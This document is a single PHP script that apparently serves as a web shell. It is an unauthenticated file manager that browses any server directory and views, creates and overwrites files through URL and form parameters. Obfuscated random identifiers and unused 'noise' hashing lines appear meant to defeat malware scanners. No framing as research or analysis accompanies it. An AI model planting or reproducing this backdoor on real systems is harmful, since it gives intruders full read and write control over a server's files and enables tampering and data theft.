<?php
function S5jdI7sT($A2kq1Lw) {
    $j8uKq3 = scandir($A2kq1Lw);
    echo "<h2>Dir: $A2kq1Lw</h2>";
    $Q2rK7tU = dirname($A2kq1Lw);
    if ($A2kq1Lw !== '/') {
        echo "<a class='btn' href='?dir=" . urlencode($Q2rK7tU) . "'>Go Back</a><br>";
    }
    echo "<form method='post'>
            <input type='text' name='nNwF8x' placeholder='Enter new file name' required>
            <input class='btn' type='submit' name='R3xP0z' value='Create File'>
        </form><br>";
    echo "<ul class='file-list'>";
    foreach ($j8uKq3 as $S7xVq9) {
        if ($S7xVq9 !== '.' && $S7xVq9 !== '..') {
            $T6zBq2 = "$A2kq1Lw/$S7xVq9";
            if (is_dir($T6zBq2)) {
                echo "<li class='dir'> <a href='?dir=" . urlencode($T6zBq2) . "'>$S7xVq9</a></li>";
            } else {
                echo "<li class='file'>
                     $S7xVq9 
                    <a class='btn' href='?view=" . urlencode($T6zBq2) . "'>View</a> 
                    <a class='btn' href='?edit=" . urlencode($T6zBq2) . "'>Edit</a>
                </li>";
            }
        }
    }
    echo "</ul>";
}

function W1dKz8oN($A2kq1Lw, $G4dR2sQ) {
    $f2mI5zA = "$A2kq1Lw/$G4dR2sQ";
    if (!file_exists($f2mI5zA)) {
        file_put_contents($f2mI5zA, "");
        echo "<p class='success'>File '$G4dR2sQ' created successfully!</p>";
    } else {
        echo "<p class='error'>File '$G4dR2sQ' already exists.</p>";
    }
}

function M6cVn9xK($J8xHq2) {
    if (file_exists($J8xHq2) && is_file($J8xHq2)) {
        $C3dBp7 = htmlspecialchars(file_get_contents($J8xHq2));
        echo "<h2>Viewing File: $J8xHq2</h2>";
        echo "<pre class='file-content'>$C3dBp7</pre>";
        echo "<a class='btn' href='?dir=" . urlencode(dirname($J8xHq2)) . "'>Back to Directory</a>";
    } else {
        echo "<p class='error'>File not found.</p>";
    }
}

function X3pVt4lZ($J8xHq2) {
    if (isset($_POST['content'])) {
        file_put_contents($J8xHq2, $_POST['content']);
        echo "<p class='success'>File saved successfully!</p>";
    }

    $C3dBp7 = htmlspecialchars(file_get_contents($J8xHq2));
    echo "<h2>Editing File: $J8xHq2</h2>";
    echo "<form method='post'>
            <textarea name='content' class='file-edit'>$C3dBp7</textarea><br>
            <input class='btn' type='submit' value='Save Changes'>
        </form>";
    echo "<a class='btn' href='?dir=" . urlencode(dirname($J8xHq2)) . "'>Back to Directory</a>";
}

$A4nQv7 = hash('sha256', 'noise_here');
$G4kQw5 = array_map('ord', str_split($A4nQv7));

if (isset($_GET['view'])) {
    $J8xHq2 = realpath($_GET['view']);
    M6cVn9xK($J8xHq2);
} elseif (isset($_GET['edit'])) {
    $J8xHq2 = realpath($_GET['edit']);
    X3pVt4lZ($J8xHq2);
} elseif (isset($_POST['R3xP0z']) && !empty($_POST['nNwF8x'])) {
    $U5yIq3 = isset($_GET['dir']) ? $_GET['dir'] : '.';
    $U5yIq3 = realpath($U5yIq3);
    W1dKz8oN($U5yIq3, $_POST['nNwF8x']);
    S5jdI7sT($U5yIq3);
} else {
    $U5yIq3 = isset($_GET['dir']) ? $_GET['dir'] : '.';
    $U5yIq3 = realpath($U5yIq3);
    if ($U5yIq3 === false || !is_dir($U5yIq3)) {
        die('Invalid directory.');
    }
    S5jdI7sT($U5yIq3);
}
?>
